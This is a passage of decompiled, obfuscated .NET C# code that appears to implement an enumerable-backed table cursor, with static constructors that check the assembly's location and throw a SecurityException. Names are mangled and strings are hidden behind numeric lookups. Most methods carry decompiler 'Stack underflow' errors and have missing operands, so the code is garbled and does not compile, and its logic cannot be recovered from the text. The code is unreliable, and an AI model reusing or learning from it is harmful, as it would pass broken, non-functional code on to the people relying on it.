			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374169);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		protected override void _0001(bool _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_001A)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			finally
			{
				base._0001(_0002);
				this._0001 = true;
			}
		}
	}
}
namespace _0010
{
	internal class _0082 : global::_0004._001A
	{
		private new static readonly string m__0001;

		private new bool m__0001;

		internal new bool _0002;

		public _0082(string _0004_001F)
			: this(_0004_001F, _001A_0084_0006: false)
		{
		}

		public _0082(string _0004_001F, bool _001A_0084_0006)
			: base(_0004_001F)
		{
			this.m__0001 = _001A_0084_0006;
		}

		protected new virtual string _0002()
		{
			return _0082.m__0001;
		}

		protected new virtual global::_0080._0017 _0001(global::_0017._0086 _0002, Type _0003)
		{
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				string text = global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107374120), new object[1] { _0003 });
				((global::_0001._0082)/*Error near IL_0032: Stack underflow*/)._0001((global::_0017._0086)/*Error near IL_0032: Stack underflow*/, text);
			}
			else
			{
				((global::_0001._0082)this)._0001(_0002, global::_0080._0014._0001(107374095));
			}
			return global::_0080._0017._0003;
		}

		protected new virtual string _0001(global::_0017._0086 _0002, object _0003)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			if (/*Error near IL_0009: Stack underflow*/ is string)
			{
				return (string)/*Error near IL_0012: Stack underflow*/;
			}
			return global::_0002._007E_0006(_0003);
		}

		protected new virtual long _0001(int _0002, int _0003)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected I8, but got Unknown
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			long num = (long)/*Error near IL_0003: Stack underflow*/;
			long num2;
			if (0 == 0)
			{
				num2 = num;
			}
			num2 = /*Error near IL_000c: Stack underflow*/<< 32;
			return num2 | (uint)_0003;
		}

		protected new virtual long _0001(global::_0017._0086 _0002, object _0003)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			int num = (((int)/*Error near IL_0004: Stack underflow*/ != 0) ? ((global::_0017._0086)/*Error near IL_002d: Stack underflow*/)._0002() : 0);
			int num2 = global::_0011._0018._0001(this.m__0001, _0003);
			return _0001(num, num2);
		}

		protected override void _0001(bool _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_0082)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			finally
			{
				base._0001(_0002);
				this._0002 = true;
			}
		}

		static _0082()
		{
			//IL_00fb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_0101: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
			_0082.m__0001 = global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107374098), new object[1] { global::_0002._007E_0016(_0091._0080_0004(typeof(_0082).TypeHandle)) });
		}
	}
}
namespace _0008
{
	internal class _0014 : _0017._0086, IEnumerator
	{
		private new IEnumerator m__0001;

		private new bool m__0001;

		internal new bool _0002;

		public virtual object Current
		{
			get
			{
				//IL_0029: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				if (0 == 0)
				{
					global::_0011._0018._0001((_0014)/*Error near IL_0030: Stack underflow*/);
				}
				((_0014)/*Error near IL_000d: Stack underflow*/)._0003();
				if (this.m__0001 == null)
				{
					return null;
				}
				return _0083_0003._007E_001D_0007(this.m__0001);
			}
		}

		public virtual bool EndOfEnumerator
		{
			get
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0014)/*Error near IL_001a: Stack underflow*/);
				((_0014)/*Error near IL_000b: Stack underflow*/)._0003();
				return this.m__0001;
			}
		}

		public virtual bool IsOpen
		{
			get
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0014)/*Error near IL_001a: Stack underflow*/);
				return ((_0014)/*Error near IL_000b: Stack underflow*/).m__0001 != null;
			}
		}

		public _0014(global::_0001._0081 _008E_0014_0006, IEnumerator _0086_0019)
			: base(_008E_0014_0006)
		{
			this.m__0001 = _0086_0019;
			this.m__0001 = true;
		}

		public virtual bool MoveNext()
		{
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0014)/*Error near IL_004e: Stack underflow*/);
			((_0014)/*Error near IL_000b: Stack underflow*/)._0003();
			if (this.m__0001 == null)
			{
				return false;
			}
			this.m__0001 = !global::_001B._007E_0086_0003(this.m__0001);
			if (!this.m__0001)
			{
				((_0017._0086)this)._0002();
			}
			return !this.m__0001;
		}

		public virtual void Reset()
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0014)/*Error near IL_002d: Stack underflow*/);
			((_0014)/*Error near IL_000b: Stack underflow*/)._0003();
			if (this.m__0001 != null)
			{
				global::_0008._007E_0089_0002(this.m__0001);
			}
		}

		public new virtual void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				((_0014)/*Error near IL_0011: Stack underflow*/).m__0001 = null;
			}
		}

		public virtual void _0003()
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0014)/*Error near IL_0026: Stack underflow*/);
			if (!((_0014)/*Error near IL_000b: Stack underflow*/).IsOpen)
			{
				throw new InvalidOperationException(_0080._0014._0001(107374581));
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			try
			{
				if (!((_0014)/*Error near IL_0007: Stack underflow*/)._0002 && 0 == 0)
				{
					((_0014)/*Error near IL_001c: Stack underflow*/)._0001();
				}
			}
			finally
			{
				base._0001(_0002);
				this._0002 = true;
			}
		}
	}
}
namespace _0015
{
	internal class _0018 : global::_0010._0082
	{
		private new IEnumerable m__0001;

		private new bool m__0001;

		internal new bool _0002;

		public _0018(string _0004_001F, IEnumerable _0080_0084_0006)
			: this(_0004_001F, _0080_0084_0006, _001A_0084_0006: false)
		{
		}

		public _0018(string _0004_001F, IEnumerable _0080_0084_0006, bool _001A_0084_0006)
			: base(_0004_001F)
		{
			if (_0080_0084_0006 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107374508));
			}
			this.m__0001 = _0080_0084_0006;
			this.m__0001 = _001A_0084_0006;
		}

		protected virtual _0080._0017 _0003(global::_0017._0086 _0002)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107374523);
			((global::_0001._0082)/*Error near IL_0010: Stack underflow*/)._0001((global::_0017._0086)/*Error near IL_0010: Stack underflow*/, (string)/*Error near IL_0010: Stack underflow*/);
			return _0080._0017._0003;
		}

		public override _0080._0017 _0001(global::_0017._0080 _0002, IntPtr _0003, string[] _0004, ref global::_0001._0081 _0005, ref string _0006)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_002b: Stack underflow*/);
			string text = this._0002();
			if (((global::_0001._0082)/*Error near IL_0014: Stack underflow*/)._0001(_0002, text, ref _0006) == _0080._0017._0002)
			{
				_0005 = new global::_0001._0081(_0004);
				return _0080._0017._0002;
			}
			return _0080._0017._0003;
		}

		public override _0080._0017 _0002(global::_0017._0080 _0002, IntPtr _0003, string[] _0004, ref global::_0001._0081 _0005, ref string _0006)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_002b: Stack underflow*/);
			string text = this._0002();
			if (((global::_0001._0082)/*Error near IL_0014: Stack underflow*/)._0001(_0002, text, ref _0006) == _0080._0017._0002)
			{
				_0005 = new global::_0001._0081(_0004);
				return _0080._0017._0002;
			}
			return _0080._0017._0003;
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002, global::_0014._0018 _0003)
		{
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_004c: Stack underflow*/);
			if (!((global::_0001._0081)/*Error near IL_000c: Stack underflow*/)._0001(_0003))
			{
				((global::_0001._0082)this)._0001(_0002, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107374482), new object[1] { _0002.TableName }));
				return _0080._0017._0003;
			}
			return _0080._0017._0002;
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0015: Stack underflow*/);
			((global::_0001._0081)/*Error near IL_000b: Stack underflow*/)._0001();
			return _0080._0017._0002;
		}

		public override _0080._0017 _0002(global::_0001._0081 _0002)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0015: Stack underflow*/);
			((global::_0001._0081)/*Error near IL_000b: Stack underflow*/)._0001();
			return _0080._0017._0002;
		}

		public unsafe override _0080._0017 _0001(global::_0001._0081 _0002, ref global::_0017._0086 _0003)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0027: Stack underflow*/);
			global::_0008._0014 obj = new global::_0008._0014(_0002, _0014_0005._007E_009C_000E(this.m__0001));
			*(global::_0008._0014*)(nint)/*Error near IL_001d: Stack underflow*/ = obj;
			return _0080._0017._0002;
		}

		public override _0080._0017 _0001(global::_0017._0086 _0002)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0036: Stack underflow*/);
			if (!(/*Error near IL_0007: Stack underflow*/ is global::_0008._0014 obj))
			{
				return _0001(_0002, _0091._0080_0004(typeof(global::_0008._0014).TypeHandle));
			}
			obj._0001();
			return _0080._0017._0002;
		}

		public override _0080._0017 _0001(global::_0017._0086 _0002, int _0003, string _0004, _001A._0018[] _0005)
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0047: Stack underflow*/);
			if (!(/*Error near IL_0007: Stack underflow*/ is global::_0008._0014 obj))
			{
				return _0001(_0002, _0091._0080_0004(typeof(global::_0008._0014).TypeHandle));
			}
			obj._0001(_0003, _0004, _0005);
			obj.Reset();
			obj.MoveNext();
			return _0080._0017._0002;
		}

		public override _0080._0017 _0002(global::_0017._0086 _0002)
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0047: Stack underflow*/);
			if (!(/*Error near IL_0007: Stack underflow*/ is global::_0008._0014 obj))
			{
				return _0001(_0002, _0091._0080_0004(typeof(global::_0008._0014).TypeHandle));
			}
			if (obj.EndOfEnumerator)
			{
				return _0003(_0002);
			}
			obj.MoveNext();
			return _0080._0017._0002;
		}

		public override bool _0001(global::_0017._0086 _0002)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_003b: Stack underflow*/);
			if (!(/*Error near IL_0007: Stack underflow*/ is global::_0008._0014 obj))
			{
				return _0001(_0001(_0002, _0091._0080_0004(typeof(global::_0008._0014).TypeHandle)));
			}
			return obj.EndOfEnumerator;
		}

		public override _0080._0017 _0001(global::_0017._0086 _0002, global::_0001._007F _0003, int _0004)
		{
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
				global::_0011._0018._0001((_0018)/*Error near IL_0062: Stack underflow*/);
			}
			if (!(/*Error near IL_0009: Stack underflow*/ is global::_0008._0014 obj))
			{
				return _0001(_0002, _0091._0080_0004(typeof(global::_0008._0014).TypeHandle));
			}
			if (obj.EndOfEnumerator)
			{
				return this._0003(_0002);
			}
			object current = obj.Current;
			if (current != null)
			{
				global::_0011._0018._0001(_0003, ((global::_0010._0082)this)._0001(_0002, current));
			}
			else
			{
				global::_0011._0018._0001(_0003);
			}
			return _0080._0017._0002;
		}

		public override _0080._0017 _0001(global::_0017._0086 _0002, ref long _0003)
		{
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0051: Stack underflow*/);
			if (!(/*Error near IL_0007: Stack underflow*/ is global::_0008._0014 obj))
			{
				return _0001(_0002, _0091._0080_0004(typeof(global::_0008._0014).TypeHandle));
			}
			if (obj.EndOfEnumerator)
			{
				return this._0003(_0002);
			}
			object current = obj.Current;
			_0003 = ((global::_0010._0082)this)._0001(_0002, current);
			return _0080._0017._0002;
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002, _001A._0018[] _0003, ref long _0004)
		{
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0041: Stack underflow*/);
			string text = global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107374381), new object[1] { _0002.TableName });
			((global::_0001._0082)/*Error near IL_0036: Stack underflow*/)._0001(_0002, text);
			return _0080._0017._0003;
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002, string _0003)
		{
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0018)/*Error near IL_0050: Stack underflow*/);
			if (!((global::_0001._0081)/*Error near IL_000c: Stack underflow*/)._0001(_0003))
			{
				((global::_0001._0082)this)._0001(_0002, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107374336), new object[2] { _0002.TableName, _0003 }));
				return _0080._0017._0003;
			}
			return _0080._0017._0002;
		}

		protected override void _0001(bool _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_0018)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			finally
			{
				base._0001(_0002);
				this._0002 = true;
			}
		}

		static _0018()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000E
{
	internal sealed class _007F<_0001> : global::_0008._0014, IDisposable, IEnumerator, IEnumerator<_0001>
	{
		private new IEnumerator<_0001> m__0001;

		private new bool m__0001;

		private _0001 System_002ECollections_002EGeneric_002EIEnumerator_003CT_003E_002ECurrent
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				((global::_000E._007F<_0001>)/*Error near IL_0031: Stack underflow*/)._0004();
				((global::_0008._0014)/*Error near IL_000b: Stack underflow*/)._0003();
				if (this._0001 == null)
				{
					return default(_0001);
				}
				return this._0001.Current;
			}
		}

		public _007F(global::_0001._0081 _008E_0014_0006, IEnumerator<_0001> _0086_0019)
			: base(_008E_0014_0006, _0086_0019)
		{
			this._0001 = _0086_0019;
		}

		public override void _0001()
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			if (((global::_000E._007F<_0001>)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				((global::_000E._007F<_0001>)/*Error near IL_0011: Stack underflow*/)._0001 = null;
			}
			((global::_0008._0014)/*Error near IL_0018: Stack underflow*/)._0001();
		}

		private void _0004()
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_000E._007F<_0001>)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_000E._007F<_0001>).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			try
			{
				if (!((global::_000E._007F<_0001>)/*Error near IL_0007: Stack underflow*/)._0001 && 0 == 0)
				{
					((global::_0008._0014)/*Error near IL_001c: Stack underflow*/)._0001();
				}
			}
			finally
			{
				base._0001(_0002);
				this._0001 = true;
			}
		}
	}
}
namespace _0010
{
	internal sealed class _0083<_0001> : global::_0015._0018
	{
		private new IEnumerable<_0001> m__0001;

		private new bool m__0001;

		public _0083(string _0004_001F, IEnumerable<_0001> _0080_0084_0006)
			: base(_0004_001F, _0080_0084_0006)
		{
			this._0001 = _0080_0084_0006;
		}

		public unsafe override global::_0080._0017 _0001(global::_0001._0081 _0002, ref global::_0017._0086 _0003)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			((global::_0010._0083<_0001>)/*Error near IL_0022: Stack underflow*/)._0002();
			global::_000E._007F<_0001> obj = new global::_000E._007F<_0001>(_0002, this._0001.GetEnumerator());
			*(global::_000E._007F<_0001>*)(nint)/*Error near IL_0018: Stack underflow*/ = obj;
			return global::_0080._0017._0002;
		}

		public override global::_0080._0017 _0001(global::_0017._0086 _0002, global::_0001._007F _0003, int _0004)
		{
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_006d: Incompatible stack heights: 0 vs 1
			((global::_0010._0083<_0001>)/*Error near IL_006a: Stack underflow*/)._0002();
			if (!(/*Error near IL_0007: Stack underflow*/ is global::_000E._007F<_0001> obj))
			{
				return this._0001(_0002, _0091._0080_0004(typeof(global::_0008._0014).TypeHandle));
			}
			if (obj.EndOfEnumerator)
			{
				return this._0003(_0002);
			}
			_0001 current = ((IEnumerator<_0001>)obj).Current;
			if (current != null)
			{
				global::_0011._0018._0001(_0003, ((_0082)this)._0001(_0002, (object)current));
			}
			else
			{
				global::_0011._0018._0001(_0003);
			}
			return global::_0080._0017._0002;
		}

		private new void _0002()
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0010._0083<_0001>)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0010._0083<_0001>).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((global::_0010._0083<_0001>)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			finally
			{
				base._0001(_0002);
				this._0001 = true;
			}
		}
	}
}
namespace _0008
{
	[CompilerGenerated]
	internal sealed class _0015
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 104)]
		private struct _0001
		{
		}

		internal static Dictionary<string, int> _0001;

		internal static _0001 _0001/* Not supported: data(FF FF FF 7F FF FF FF 7F 01 00 00 00 01 00 00 00 08 00 00 00 08 00 00 00 08 00 00 00 08 00 00 00 08 00 00 00 10 00 00 00 02 00 00 00 04 00 00 00 08 00 00 00 FF FF FF 7F 01 00 00 00 04 00 00 00 FF FF FF 7F 08 00 00 00 02 00 00 00 04 00 00 00 08 00 00 00 08 00 00 00 FF FF FF 7F FF FF FF 7F FF FF FF 7F FF FF FF 7F) */;

		internal static Dictionary<string, int> _0002;
	}
}
